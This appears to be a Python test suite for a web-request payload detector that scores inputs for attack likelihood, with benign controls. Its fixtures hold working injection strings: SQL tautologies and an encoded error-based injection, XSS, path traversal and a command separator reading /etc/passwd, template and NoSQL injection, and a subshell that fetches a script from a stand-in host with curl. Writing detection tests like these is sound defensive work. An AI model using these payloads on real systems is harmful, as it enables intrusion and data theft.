import asyncio

from adiuvare.core.models import RequestContext
from adiuvare.signals.payload import PayloadSignal


def test_payload_stays_clean_when_empty():
    ctx = RequestContext(
        identity="u1",
        payload=None,
        url="/",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0


def test_payload_marks_sqlish_text():
    ctx = RequestContext(
        identity="u1",
        payload="select * from users",
        url="/login",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/login",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_script_text():
    ctx = RequestContext(
        identity="u1",
        payload="<script>alert(1)</script>",
        url="/comment",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/comment",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.6


def test_payload_does_not_flag_normal_select_text():
    ctx = RequestContext(
        identity="u1",
        payload="please select an option",
        url="/settings",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/settings",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0


def test_payload_marks_path_traversal_text():
    ctx = RequestContext(
        identity="u1",
        payload="../../etc/passwd",
        url="/download",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/download",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score > 0.5


def test_payload_decodes_wrapped_script_text():
    ctx = RequestContext(
        identity="u1",
        payload="%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
        url="/comment",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/comment",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.6


def test_payload_marks_comment_truncation_text():
    ctx = RequestContext(
        identity="u1",
        payload="admin'--",
        url="/login",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/login",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.8


def test_payload_marks_shell_separator_probe_text():
    ctx = RequestContext(
        identity="u1",
        payload="name=ok;cat /etc/passwd",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_subshell_probe_text():
    ctx = RequestContext(
        identity="u1",
        payload="$(curl http://evil.example/p.sh)",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.7


def test_payload_marks_boolean_tautology_text():
    ctx = RequestContext(
        identity="u1",
        payload="' OR 'a'='a",
        url="/login",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/login",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.8


def test_payload_marks_ssti_expression_text():
    ctx = RequestContext(
        identity="u1",
        payload="{{7*7}}",
        url="/render",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/render",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.6


def test_payload_marks_nested_nosql_operator_text():
    ctx = RequestContext(
        identity="u1",
        payload='{"username":{"$ne":null}}',
        url="/login",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/login",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.6


def test_payload_marks_encoded_function_sqli_text():
    ctx = RequestContext(
        identity="u1",
        payload="%27%20AND%20updatexml%281%2Cconcat%280x7e%2Cuser%28%29%29%2C1%29--",
        url="/search",
        method="POST",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score >= 0.8


def test_payload_keeps_union_phrase_clean():
    ctx = RequestContext(
        identity="u1",
        payload="union of sets and intervals",
        url="/search",
        method="GET",
        headers={},
        ip="127.0.0.1",
        endpoint="/search",
    )

    res = asyncio.run(PayloadSignal().extract(ctx))
    assert res.score == 0.0
